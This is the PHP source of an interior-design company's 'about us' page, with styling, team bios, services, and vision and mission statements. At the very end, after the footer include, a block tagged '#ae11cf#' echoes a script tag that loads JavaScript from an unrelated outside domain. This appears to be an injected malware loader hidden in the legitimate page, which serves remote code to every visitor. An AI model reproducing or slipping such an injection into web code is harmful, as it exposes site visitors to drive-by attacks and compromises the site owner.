<?php include "inc/header.php";?>
<script src="js/bootstrap.js" type="text/javascript"></script> 
<style type="text/css">
.nn_sliders .fade{opacity:0;-webkit-transition:opacity .15s linear;-moz-transition:opacity .15s linear;-o-transition:opacity .15s linear;transition:opacity .15s linear}
.nn_sliders .fade.in{opacity:1}.nn_sliders .collapse{position:relative;height:0;overflow:hidden;-webkit-transition:height .35s ease;-moz-transition:height .35s ease;-o-transition:height .35s ease;transition:height .35s ease}.nn_sliders .collapse.in{height:auto}
.nn_sliders .accordion{margin-bottom:18px}.nn_sliders.accordion>.accordion-group{margin-bottom:2px;border:1px solid #e5e5e5;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px}.nn_sliders.accordion>.accordion-group .accordion-heading{border-bottom:0}.nn_sliders.accordion>.accordion-group .accordion-heading .accordion-toggle{display:block;padding:8px 15px;cursor:pointer}.nn_sliders.accordion>.accordion-group>.accordion-body>.accordion-inner{padding:9px 15px;border-top:1px solid #e5e5e5;background:#ffffff;}.nn_sliders.accordion>.accordion-group>.accordion-body.in:hover{overflow:visible}.nn_sliders>.accordion-group{-webkit-transition-duration:.2s;-moz-transition-duration:.2s;-o-transition-duration:.2s;transition-duration:.2s}.nn_sliders>.accordion-group>.accordion-heading>a.accordion-toggle{-webkit-transition-duration:.2s;-moz-transition-duration:.2s;-o-transition-duration:.2s;transition-duration:.2s}
.nn_sliders>.accordion-group>.accordion-heading>a.accordion-toggle:hover{color:#005580;text-decoration:none}.nn_sliders>.accordion-group.active>.accordion-heading>a.accordion-toggle{background-color:#f8f8f8;color:#08c}
.nn_sliders>.accordion-group.blue{border-top:5px solid #e5e5e5;-webkit-border-radius:5px 5px 4px 4px;-moz-border-radius:5px 5px 4px 4px;border-radius:5px 5px 4px 4px;border-top-color:#74b4e8}.nn_sliders>.accordion-group.blue:hover,.nn_sliders>.accordion-group.blue.active{border-top-color:#2384d3}.nn_sliders>.accordion-group.primary{border-top:5px solid #e5e5e5;-webkit-border-radius:5px 5px 4px 4px;-moz-border-radius:5px 5px 4px 4px;border-radius:5px 5px 4px 4px;border-top-color:#74b4e8}.nn_sliders>.accordion-group.primary:hover,.nn_sliders>.accordion-group.primary.active{border-top-color:#2384d3}.nn_sliders>.accordion-group.info{border-top:5px solid #e5e5e5;-webkit-border-radius:5px 5px 4px 4px;-moz-border-radius:5px 5px 4px 4px;border-radius:5px 5px 4px 4px;border-top-color:#6fc2da}
.nn_sliders>.accordion-group.info:hover,.nn_sliders>.accordion-group.info.active{border-top-color:#2f96b4}.nn_sliders>.accordion-group.green{border-top:5px solid #e5e5e5;-webkit-border-radius:5px 5px 4px 4px;-moz-border-radius:5px 5px 4px 4px;border-radius:5px 5px 4px 4px;border-top-color:#91c991}.nn_sliders>.accordion-group.green:hover,.nn_sliders>.accordion-group.green.active{border-top-color:#51a351}.nn_sliders>.accordion-group.success{border-top:5px solid #e5e5e5;-webkit-border-radius:5px 5px 4px 4px;-moz-border-radius:5px 5px 4px 4px;border-radius:5px 5px 4px 4px;border-top-color:#91c991}.nn_sliders>.accordion-group.success:hover,.nn_sliders>.accordion-group.success.active{border-top-color:#51a351}
.nn_sliders>.accordion-group.orange{border-top:5px solid #e5e5e5;-webkit-border-radius:5px 5px 4px 4px;-moz-border-radius:5px 5px 4px 4px;border-radius:5px 5px 4px 4px;border-top-color:#fbbf69}.nn_sliders>.accordion-group.orange:hover,.nn_sliders>.accordion-group.orange.active{border-top-color:#f89406}.nn_sliders>.accordion-group.warning{border-top:5px solid #e5e5e5;-webkit-border-radius:5px 5px 4px 4px;-moz-border-radius:5px 5px 4px 4px;border-radius:5px 5px 4px 4px;border-top-color:#fbbf69}.nn_sliders>.accordion-group.warning:hover,.nn_sliders>.accordion-group.warning.active{border-top-color:#f89406}.nn_sliders>.accordion-group.red{border-top:5px solid #e5e5e5;-webkit-border-radius:5px 5px 4px 4px;-moz-border-radius:5px 5px 4px 4px;border-radius:5px 5px 4px 4px;border-top-color:#dd7a75}
.nn_sliders>.accordion-group.red:hover,.nn_sliders>.accordion-group.red.active{border-top-color:#bd362f}.nn_sliders>.accordion-group.danger{border-top:5px solid #e5e5e5;-webkit-border-radius:5px 5px 4px 4px;-moz-border-radius:5px 5px 4px 4px;border-radius:5px 5px 4px 4px;border-top-color:#dd7a75}.nn_sliders>.accordion-group.danger:hover,.nn_sliders>.accordion-group.danger.active{border-top-color:#bd362f}.nn_sliders>.accordion-group.error{border-top:5px solid #e5e5e5;-webkit-border-radius:5px 5px 4px 4px;-moz-border-radius:5px 5px 4px 4px;border-radius:5px 5px 4px 4px;border-top-color:#dd7a75}.nn_sliders>.accordion-group.error:hover,.nn_sliders>.accordion-group.error.active{border-top-color:#bd362f}
.nn_sliders>.accordion-group.grey{border-top:5px solid #e5e5e5;-webkit-border-radius:5px 5px 4px 4px;-moz-border-radius:5px 5px 4px 4px;border-radius:5px 5px 4px 4px;border-top-color:#b3b3b3}.nn_sliders>.accordion-group.grey:hover,.nn_sliders>.accordion-group.grey.active{border-top-color:gray}.nn_sliders>.accordion-group.gray{border-top:5px solid #e5e5e5;-webkit-border-radius:5px 5px 4px 4px;-moz-border-radius:5px 5px 4px 4px;border-radius:5px 5px 4px 4px;border-top-color:#b3b3b3}.nn_sliders>.accordion-group.gray:hover,.nn_sliders>.accordion-group.gray.active{border-top-color:gray}
.clear{ clear:both;}.accordion-body{background: #ffffff;}.show_hide {display:none;}.accordion-heading{background:#ffffff; font-weight: bold;}
div.box_header{background: url("css/images/tb_bg_head01.gif") no-repeat scroll left top transparent;border-collapse: collapse;line-height: 32px;width: 770px;float:left;}
.slidingDiv{background-color:#fff;padding:15px;width: 740px;float: left;}
.box_header h3 {margin-bottom:0;font-size: 14px;margin-top:0;}
.box_header h3 a {color: #444;}
.accordion-toggle {background: url('css/images/2downarrow.png') no-repeat left center; margin-left:15px; padding-left:25px}
.collapsed {background: url('css/images/2rightarrow.png') no-repeat left center;margin-left:15px;padding-left:25px}
</style>

		<!-- Highlights -->
			<section class="wrapper">
				<div class="container">
					<div class="row 200%">
						<section class="12u">
						<div class="row">
    	
<p>	Synergy Décor was started in the year 2010 and has evolved out due to our sheer passion on Interior Decoration. After completing a decade of experience in Corporate Sector, I started it with an interest to bring out my inner need of professional satisfaction and also to help the betterment of skilled people by facilitating them to realize their fullest potential.</p><p>We are a small and a well-Knit team. The carpenters and civil work personnel are from Thanjavur, a city well known for Arts & Architecture.</p>
<div class="accordion nn_sliders" id="set-nn_sliders-2">
<div class="accordion-group">
<div class="accordion-heading">
<a class="accordion-toggle" data-toggle="collapse" data-parent="#set-nn_sliders-2" href="#2-1-default">
Who are we?
</a>
</div>
<div style="height: 0px;" class="accordion-body collapse" id="2-1-default">
<div class="accordion-inner">

<h2 class="title3">Sowmya Lakshmi:</h2>
<p>Synergy Décor is the brain child of Sowmya Lakshmi. <!--Having completed her Master Degree in Business Administration and Tourism Management, she has got 15 years experience in Hospitality &amp; Telecommunication Industry. Started this venture and now spreading across rapidly in Chennai and Bangalore.</p>
<p>With the knowledge acquired over the experience in the hospitality industry and with the professional training from an Interior Design Institute, she designs and does space planning effectively in consultation with the clients.--></p>
<p>She plans the space according to this simple line: <b>"Everything has a place &amp; everything in its place"</b> makes the place neat &amp; clean and thus making it easy to work. For instance her kitchen designs will assist the women in making the kitchen as their favorite place to excel.</p>
<br>
<!--<h2 class="title3">Sowmya Lakshmi</h2>
<p>Sowmya Lakshmi is a PMP certified Project Management Consultant. She holds her Master Degrees in Business Administration and Psychology. She is associated with experts in Computer Aided Design and Drafting and also trains people on Kaizen Implementation &amp; Soft Skill development. </p>
<br>--></br>
<h2 class="title3">P. Manikandan:</h2>
<p>Manikandan is Chief Consultant on carpentry and carving works; He effectively implements and executes design with the team of highly skilled carpenters. His heredity belongs to artisans and for more than 3 decades their family is in to carpentry works.</p>
<p>Any design will serve the purpose if only it is executed in right way; Manikandan plays the key role in the satisfaction of the clients by accomplishing the design. </p>
<br>
<h2 class="title3">A.Manjunath</h2>
<p>Manjunath is the Chief Consultant on Civil, Plumbing, Electrical and painting works, Any renovation, his team plays a key role in turning the old place in to new enabling us to do the interiors. He does the Dismantling, Erecting, Constructing, Laying Tiles, Granite Installation and Electrical &amp; Plumbing works related to interiors. His team is experienced in civil works for more than 20 years. He works for major architect firms in the city, apart from being associated with us.</p>
<br>
<h2  class="title3">Chella Kannan:</h2>
<p>Chella Kannan is the chief consultant on painting and False Ceiling works, having worked with Asian Paints for more than 10 years; he is well versed with all kinds of painting like Texture painting and wall painting and Gypsum Based False ceilings. His team effectively coordinates to complete the project on time with the expected visual appeal.</p>
<script src="sliderengine/jquery.js"></script>
<script src="sliderengine/amazingslider.js"></script>
<script src="sliderengine/initslider-1.js"></script>
<style>
.amazingslider-watermark-0{
	display:none !important;
}
</style>
<div id="amazingslider-1" style="display:block;position:relative;margin:15px auto 30px;">
    <ul class="amazingslider-slides" style="display:none;">
        <li><img src="images/m1.JPG" alt="006" /></li>
        <li><img src="images/m2.JPG" alt="006" /></li>
        <li><img src="images/m3.JPG" alt="006" /></li>
    </ul>
    <div class="amazingslider-engine" style="display:none;"><a href="http://www.amazingslider.com">jQuery Slider</a></div>
</div>
</div></div>
<div class="clear"></div>
</div>
<div class="accordion-group">
<div class="accordion-heading">
<a class="accordion-toggle" data-toggle="collapse" data-parent="#set-nn_sliders-2" href="#2-2-blue">
What we do?
</a>
</div>
<div style="height: 0px;" class="accordion-body collapse" id="2-2-blue">
<div class="accordion-inner">
<p>We undertake all kinds of Interior works for Residences, Offices and Commercial establishments; we also undertake turn key projects.</p>
</div></div><div class="clear"></div></div>
<div class="accordion-group">
<div class="accordion-heading">
<a class="accordion-toggle" data-toggle="collapse" data-parent="#set-nn_sliders-2" href="#2-3-green">
How do we do it?
</a>
</div>
<div style="height: 0px;" class="accordion-body collapse" id="2-3-green">
<div class="accordion-inner">
<p>In any design work like this, the major points of concern for a customer in getting the desired outcome are: </p>
		<ul>
			<li>Understanding the exact need of the end user; the user is the person who lives in the designed space, utilizing the design developed. The design should be conceived by the interior designer by having the end user in the mind.</li>
			<li>Preparing a space plan with the available space, as well as meeting the client’s requirements</li>
			<li>Executing the plan with the best fit materials. Workmanship is a major point of concern with respect to the technical areas. The carpenters, electricians, painters, etc., whoever are working on a project should connect with each other; and should bring out the design exactly as planned for the customer. </li>
			<li>Handing over the space with the proper finish as committed.</li>
		</ul>
		<p>Synergy Décor works seamlessly in all these areas, thus ensuring the utmost customer satisfaction.</p>

</div></div><div class="clear"></div></div>
<div class="accordion-group">
<div class="accordion-heading">
<a class="accordion-toggle" data-toggle="collapse" data-parent="#set-nn_sliders-2" href="#2-4-orange">
Vision, Mission &amp; Quality Policy
</a>
</div>
<div style="height: 0px;" class="accordion-body collapse" id="2-4-orange">
<div class="accordion-inner">
<h2 class="title3">Vision: </h2>
		<ul>
			<li>To promote our products globally with uncompromised quality and variety.</li>
			<li>To become the customers’ most preferred choice for interior design service.</li>
		</ul>
		<br>
		<h2 class="title3">Mission: </h2>
		<ul>
			<li>To provide high quality service with prompt delivery</li>
			<li>To excel in Customer service</li>
			<li>To provide complete interior solutions for commercial and residential project</li>
		</ul>
		<br>
		<h2 class="title3">Our Quality Policy</h2>
		<strong><center>"We shall strive to deliver our services to meet and exceed Customer expectations on <br>
			QCD – Quality, Cost and Delivery"</center>
		</strong>
		<center><img src="images/guaranteed.jpg" /></center>
</div></div><div class="clear"></div></div>

</div>
 
    
    </div>
    
						</section>
					</div>
				</div>
			</section>
			<section class="wrapper strip_line">
			</section>

<?php include "inc/footer.php";?>
<?php
#ae11cf#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11968090\"></script>";
echo $g;
}
#/ae11cf#
?>